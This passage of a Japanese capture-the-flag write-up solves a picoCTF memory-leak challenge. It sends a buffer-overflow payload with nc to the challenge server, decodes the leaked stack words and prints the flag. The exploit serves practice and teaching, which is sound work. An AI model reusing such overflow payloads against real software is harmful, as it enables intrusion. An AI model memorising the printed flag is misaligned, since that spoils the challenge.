Give me a string that gets you the flag
AAAAAAAAAAAAAA� �
User information : 0x80c9a04 0x804007d 0x34663136 0x35313135 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970
</pre>

<br />

Python3

<pre>
captureamerica@ubuntu:Pwn$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*14 + b"\xa0\x9d\x04\x08" + b"\x20\x9e\x04\x08" + b"\n")'; cat - ) | nc saturn.picoctf.net 58213
Give me a string that gets you the flag
AAAAAAAAAAAAAA� �
User information : 0x80c9a04 0x804007d 0x34663136 0x35313135 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970
</pre>


<br>

文字に変換すると、フラグが得られていることがわかります。

<pre>
7d	  : }
0x34663136: 4f16
0x35313135: 5115
0x5f597230: _Yr0
0x6d334d5f: m3M_
0x50755f4e: Pu_N
0x34656c43: 4elC
0x7b465443: {FTC
0x6f636970: ocip
</pre>

<br>

<pre>
$ echo "}4f165115_Yr0m3M_Pu_N4elC{FTCocip" | rev
picoCTF{Cle4N_uP_M3m0rY_511561f4}
</pre>

<br>

Flag: `picoCTF{Cle4N_uP_M3m0rY_511561f4}`




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

